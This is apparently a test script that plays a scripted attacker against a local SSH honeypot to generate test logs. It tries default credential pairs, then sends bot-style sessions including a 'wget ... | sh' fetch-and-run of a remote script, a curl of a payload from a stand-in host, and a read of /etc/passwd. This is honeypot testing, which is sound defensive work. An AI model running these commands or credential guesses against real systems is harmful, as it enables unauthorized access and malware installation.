"""A scripted attacker: drives a running honeypot over real SSH to make test logs."""

from __future__ import annotations

import asyncio

import asyncssh

BOT_CREDS = [("root", "admin"), ("admin", "admin"), ("root", "123456")]
SESSIONS = [
    ["uname -a", "cat /proc/cpuinfo | grep name | head -n 1", "whoami"],
    [
        "cd /tmp",
        "wget http://203.0.113.9/x.sh -O- | sh",
        "chmod +x x.sh",
        "./x.sh",
        "exit",
    ],
    ["cat /etc/passwd", "ls /", "curl http://198.51.100.4/payload", "exit"],
]


async def _try(host: str, port: int, user: str, password: str):
    return await asyncssh.connect(
        host,
        port,
        username=user,
        password=password,
        known_hosts=None,
        client_keys=None,
        preferred_auth="password",
        connect_timeout=10,
    )


async def run(host: str = "127.0.0.1", port: int = 2222) -> dict:
    """Fail twice, get in on the third try, run scripted sessions, probe a forward."""
    stats = {"denied": 0, "sessions": 0, "commands": 0, "forward_refused": 0}
    for user, pw in BOT_CREDS[:2]:
        try:
            await _try(host, port, user, pw)
        except asyncssh.PermissionDenied:
            stats["denied"] += 1
    user, pw = BOT_CREDS[2]
    async with await _try(host, port, user, pw) as conn:
        for script in SESSIONS:
            async with conn.create_process(term_type="xterm") as proc:
                await asyncio.wait_for(proc.stdout.readuntil("# "), 10)
                for line in script:
                    proc.stdin.write(line + "\n")
                    if line == "exit":
                        break
                    await asyncio.wait_for(proc.stdout.readuntil("# "), 10)
                    stats["commands"] += 1
                stats["sessions"] += 1
        try:  # ask the honeypot to open a TCP connection for us: it must refuse
            await conn.open_connection("example.com", 80)
        except (asyncssh.Error, OSError):
            stats["forward_refused"] += 1
        result = await conn.run("uname -r")
        stats["exec_output"] = result.stdout.strip()
    return stats
